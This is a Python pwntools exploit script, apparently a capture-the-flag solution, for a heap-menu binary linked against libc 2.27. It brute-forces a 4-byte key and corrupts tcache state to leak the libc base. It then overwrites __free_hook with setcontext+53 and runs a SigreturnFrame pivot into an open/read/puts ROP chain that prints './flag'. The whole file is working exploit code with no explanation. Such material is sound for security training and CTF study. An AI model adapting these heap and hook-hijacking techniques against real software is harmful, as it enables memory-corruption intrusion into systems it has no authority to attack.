from pwn import*
context.log_level ='DEBUG'
context.arch = 'AMD64'
def menu(ch):
	p.sendlineafter('Your choice: ',str(ch))
def new(index):
	menu(1)
	p.sendlineafter('Index:',str(index))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index:',str(index))
	p.sendafter('Content:',content)
def show(index):
	menu(3)
	p.sendlineafter('Index:',str(index))
def free(index):
	menu(4)
	p.sendlineafter('Index:',str(index))
def gift(content):
	menu(5)
	p.sendafter('cookie?',content)
p = process('./main')
libc =ELF('./libc-2.27.so')
for i in range(12):
	new(0)
def bf(key):
	try:
		new(0)
		edit(0,'\x00'*0x28 + key)
		menu(2)
		p.sendlineafter('Index:','0')
		data = p.recvuntil('Content:',timeout=0.05)
		if 'Content' in data:
			return True
	except:
		return False
key = ''
for n in range(4):
	for i in range(256):
		tmp = key + chr(i)
		if bf(tmp):
			key += chr(i)
			p.sendline('FMYY')
			break
		else:
			continue
log.info('Key:\t' + key)
for i in range(15):
	new(i + 1)
for i in range(7):
	free(15 - i)
for i in range(8):
	free(15 - 7 - i)
menu('0'*0x500)

gift(('\x00'*0x28 + key + p32(0) +  p64(0) + p64(0x41))*5)
#gdb.attach(p,"set *$rebase(0x202028)=0xDEADBEEF")

for i in range(7):
	new(i + 9)

new(0)
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] -0x70
log.info('LIBC:\t' + hex(libc_base))
free(2)
gift(('\x00'*0x28 + key + p32(0) + p64(0) + p64(0x41))*5)
free(2)
new(0)
edit(0,p64(libc_base + libc.sym['__free_hook']))
new(0)
new(0)
edit(0,p64(libc_base + libc.sym['setcontext'] + 53))
#########################################3
free_hook = libc_base + libc.sym['__free_hook']
Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
syscall = libc_base + libc.sym['syscall']
pop_rdi_ret = libc_base + 0x000000000002155F
pop_rdx_ret = libc_base + 0x0000000000001B96
pop_rsi_ret = libc_base + 0x0000000000023E8A
pop_rax_ret = libc_base + 0x0000000000043A78
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = free_hook
frame.rdx = 0x2000
frame.rsp = free_hook
frame.rip = Read

orw  = p64(pop_rax_ret) + p64(2)
orw += p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(syscall + 23)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_ret) + p64(0x30)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
###################################
gift(str(frame))
sleep(0.2)
p.sendline(orw)
p.interactive()
